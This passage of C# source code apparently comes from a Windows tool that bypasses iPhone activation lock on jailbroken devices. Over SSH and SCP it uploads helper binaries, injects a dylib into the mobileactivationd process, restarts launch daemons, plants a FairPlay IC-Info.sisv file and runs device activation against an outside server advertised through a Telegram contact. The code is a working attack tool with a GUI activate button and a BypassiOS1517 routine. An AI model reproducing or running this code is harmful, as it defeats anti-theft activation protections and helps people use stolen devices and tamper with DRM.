                    Scp.Connect();
                }

                Ssh.CreateCommand("echo hola").Execute();

                Scp.Upload(new FileInfo("Carbon\\executeFunction"), "/./private/var/mobile/executeFunction");

                Ssh.CreateCommand("chmod +x /private/var/mobile/executeFunction").Execute();

                Ssh.CreateCommand("/private/var/mobile/executeFunction MadGate.createTunnel1SessionInfo:").Execute();

                Delete("tmp\\Jaguar");

                GetDenisse();

                Scp.Upload(new FileInfo("tmp\\Jaguar"), "/./private/var/mobile/Jaguar");

                Delete("tmp\\Jaguar");

                Ssh.CreateCommand("chmod +x /private/var/mobile/Jaguar").Execute();

                Ssh.CreateCommand("chmod +x /private/var/mobile/Jaguar").Execute();

                Ssh.CreateCommand("/private/var/mobile/Jaguar drmHandler").Execute();

                Scp.Upload(new FileInfo("Carbon\\ellekit"), "/./private/var/mobile/ellekit.tar");

                Ssh.CreateCommand("mkdir -p /private/var/jb").Execute();

                Ssh.CreateCommand("tar -xvf /private/var/mobile/ellekit.tar -C /private/var/jb/").Execute();

                Ssh.CreateCommand("chmod -R 755 /private/var/jb").Execute();

                Ssh.CreateCommand("/private/var/jb/usr/libexec/ellekit/loader").Execute();

                try
                {
                    Ssh.CreateCommand("launchctl reboot userspace").Execute();
                }
                catch { }
                Thread.Sleep(15000);

                if (!Ssh.IsConnected)
                {
                    Ssh.Connect();
                }

                if (!Scp.IsConnected)
                {
                    Scp.Connect();
                }

                Ssh.CreateCommand("ps -ax | grep mobileactivationd >/private/var/mobile/PID.txt").Execute();

                Scp.Download("/private/var/mobile/PID.txt", new FileInfo("tmp\\PID.txt"));

                string PID = SheLL("lib\\cat.exe tmp/PID.txt | lib\\grep.exe /usr | lib\\awk.exe '{printf $1}'");

                File.WriteAllText("PID.txt", PID);

                Scp.Upload(new FileInfo("lib\\libcrypt2.dll"), "/private/var/jb/Library/MobileSubstrate/DynamicLibraries/dylib.dylib");

                Scp.Upload(new FileInfo("lib\\libcrypt2.a"), "/private/var/jb/Library/MobileSubstrate/DynamicLibraries/dylib.plist");

                Scp.Upload(new FileInfo("Carbon\\inyector"), "/./private/var/mobile/inyector");

                Ssh.CreateCommand("chmod +x /./private/var/mobile/inyector").Execute();

                Ssh.CreateCommand("/private/var/mobile/inyector " + PID + " /private/var/jb/Library/MobileSubstrate/DynamicLibraries/dylib.dylib").Execute();

                Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Ssh.CreateCommand("launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Pair();

                SheLL("lib\\busybox.exe bash -c \"lib/ideviceactivation.exe activate -d -s 'If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php?process=step1' &>activationChecks.txt\"");

                Ssh.CreateCommand("/private/var/mobile/Jaguar Record").Execute();

                Ssh.CreateCommand("rm /private/var/jb/Library/MobileSubstrate/DynamicLibraries/dylib.dylib").Execute();

                Ssh.CreateCommand("rm /private/var/jb/Library/MobileSubstrate/DynamicLibraries/dylib.plist").Execute();

                Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Ssh.CreateCommand("launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();



                Scp.Upload(new FileInfo("Carbon\\.cache2.txt"), "/./private/var/mobile/kernel");

                Ssh.CreateCommand("chmod +x /private/var/mobile/kernel").Execute();

                Ssh.CreateCommand("/private/var/mobile/kernel").Execute();

                Ssh.CreateCommand("/private/var/mobile/Jaguar drmInfo").Execute();

                Pair();

                SheLL("lib\\busybox.exe bash -c \"lib/ideviceactivation.exe activate -d -s 'If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php?process=step2' &>activationSigner.txt\"");

                try
                {
                    File.WriteAllText("tmp\\rd.xml", Asir());
                }
                catch
                {

                }

                if (File.Exists("tmp\\rd.xml"))
                {

                    string drmInfo = File.ReadAllText("tmp\\rd.xml").Replace("\n", "").Replace("\r", "");

                    Ssh.CreateCommand("/private/var/mobile/kernel " + drmInfo).Execute();

                }

                try
                {
                    Scp.Download("/private/var/mobile/Media/Downloads/cmds.xml", new FileInfo("tmp\\cmds.xml"));
                }
                catch
                {

                }


                File.WriteAllText("tmp\\.tmp", Abir());

                Ssh.CreateCommand("/private/var/mobile/Jaguar abir").Execute();

                string folderPath = "tmp";
                try
                {
                    // Obtener una lista de todos los archivos en la carpeta
                    string[] files = Directory.GetFiles(folderPath);

                    // Eliminar cada archivo
                    foreach (string file in files)
                    {
                        File.Delete(file);
                        Console.WriteLine($"Eliminado: {file}");
                    }

                    Console.WriteLine("Todos los archivos han sido eliminados.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                }
                Ssh.CreateCommand("rm /var/mobile/Media/Downloads/*").Execute();
                Ssh.CreateCommand("ps -ax | grep mobileactivationd >/private/var/mobile/PID.txt").Execute();

                Scp.Download("/private/var/mobile/PID.txt", new FileInfo("tmp\\PID.txt"));


                File.WriteAllText("PID.txt", PID);

                Scp.Upload(new FileInfo("lib\\libcrypt2.dll"), "/private/var/jb/Library/MobileSubstrate/DynamicLibraries/dylib.dylib");

                Scp.Upload(new FileInfo("lib\\libcrypt2.a"), "/private/var/jb/Library/MobileSubstrate/DynamicLibraries/dylib.plist");

                Ssh.CreateCommand("chmod +x /./private/var/mobile/inyector").Execute();

                Ssh.CreateCommand("/private/var/mobile/inyector " + PID + " /private/var/jb/Library/MobileSubstrate/DynamicLibraries/dylib.dylib").Execute();

                Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Ssh.CreateCommand("launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Pair();

                SheLL("lib\\busybox.exe bash -c \"lib/ideviceactivation.exe activate -d -s 'If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php?process=step1' &>activationChecks.txt\"");


                Ssh.CreateCommand("/private/var/mobile/kernel").Execute();

                Ssh.CreateCommand("/private/var/mobile/Jaguar drmInfo").Execute();

                Ssh.CreateCommand("rm /private/var/jb/Library/MobileSubstrate/DynamicLibraries/dylib.dylib").Execute();

                Ssh.CreateCommand("rm /private/var/jb/Library/MobileSubstrate/DynamicLibraries/dylib.plist").Execute();

                Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Ssh.CreateCommand("launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Pair();

                SheLL("lib\\busybox.exe bash -c \"lib/ideviceactivation.exe activate -d -s 'If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php?process=step2' &>activationSigner.txt\"");

                try
                {
                    File.WriteAllText("tmp\\rd.xml", Asir());
                }
                catch
                {

                }

                if (File.Exists("tmp\\rd.xml"))
                {

                    string drmInfo = File.ReadAllText("tmp\\rd.xml").Replace("\n", "").Replace("\r", "");

                    Ssh.CreateCommand("/private/var/mobile/kernel " + drmInfo).Execute();

                }

                try
                {
                    Scp.Download("/private/var/mobile/Media/Downloads/cmds.xml", new FileInfo("tmp\\cmds.xml"));
                }
                catch
                {

                }


                File.WriteAllText("tmp\\.tmp", Abir());

                Ssh.CreateCommand("/private/var/mobile/Jaguar abir").Execute();
                string CommCenter = "/private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist";

                Ssh.CreateCommand("chflags nouchg " + CommCenter).Execute();

                Ssh.CreateCommand("/private/var/mobile/Jaguar Wildcard").Execute();

                Ssh.CreateCommand("/private/var/mobile/Jaguar Record").Execute();

                Ssh.CreateCommand("/private/var/mobile/Jaguar Flag").Execute();

                Ssh.CreateCommand("rm /private/var/mobile/Jaguar").Execute();

                Delete("tmp\\IC-Info.sisv");
                GetICInfo();
                Scp.Upload(new FileInfo("tmp\\IC-Info.sisv"), "/./private/var/mobile/IC-Info.sisv");

                Ssh.CreateCommand("mkdir -p /private/var/mobile/Library/FairPlay/iTunes_Control/iTunes").Execute();
                Ssh.CreateCommand("mv -f /private/var/mobile/IC-Info.sisv /private/var/mobile/Library/FairPlay/iTunes_Control/iTunes/").Execute();
                Ssh.CreateCommand("chmod -R 755 /private/var/mobile/Library/FairPlay").Execute();
                Ssh.CreateCommand("chmod 0664 /private/var/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv").Execute();
                Ssh.CreateCommand("chown -R mobile:mobile /private/var/mobile/Library/FairPlay").Execute();

                Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons").Execute();

                Ssh.CreateCommand("launchctl load /System/Library/LaunchDaemons").Execute();

                Thread.Sleep(20000);

                if (DeviceInfo("ActivationState") != "Unactivated")
                {
                    BoxShow("Successfully Activated Device!", "MESSAGE");
                }
                else
                {
                    BoxShowError("Upps Error! :(", "ERROR");
                }

            }
            catch (Exception e)
            {
                Invoke((MethodInvoker)(() => guna2ProgressBar1.Visible = false));
                BoxShowError(e.Message, "ERROR");
            }
            Invoke((MethodInvoker)(() => guna2ProgressBar1.Visible = false));
            Delete("tmp\\rd.xml");
            Invoke((MethodInvoker)(() => saaButton3.Enabled = true));
            Invoke((MethodInvoker)(() => saaButton3.Text = "Activate"));

        }

        private void saaButton3_Click_1(object sender, EventArgs e)
        {
            if(CheckSIMLockCarrier().Contains("SIMLock | Network Status: Unlocked"))
            {
                StartProcessBasedOnVersion(DeviceInfo("ProductVersion"));
            }
            else
            {
                BoxShowWarning("Your Device is Carrier Lock, please insert R-SIM or SIM From Original Carrier", "WARNING");
                DialogResult result = MessageBox.Show("If you don't follow instructions, your device can't activated, Continue with Activation?", "MESSAGE", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (result == DialogResult.Yes)
                {
                    StartProcessBasedOnVersion(DeviceInfo("ProductVersion"));
                }
                else if (result == DialogResult.No)
                {
                    BoxShow("Cancelled", "Message");
                }
            }
        }

        private void backgroundWorker5_DoWork(object sender, DoWorkEventArgs e)
        {
            BypassiOS1517();
        }

        private void saaButton4_Click_1(object sender, EventArgs e)
        {
            Form3 frm3 = new Form3();
            frm3.Show();
        }

        private void saaButton5_Click(object sender, EventArgs e)
        {
            Process.Start("lib\\WinRa1n2.1.exe");
        }

        private void saaButton4_Click_2(object sender, EventArgs e)
        {
            Form3 frm3 = new Form3();
            frm3.Show();
        }


    }
}
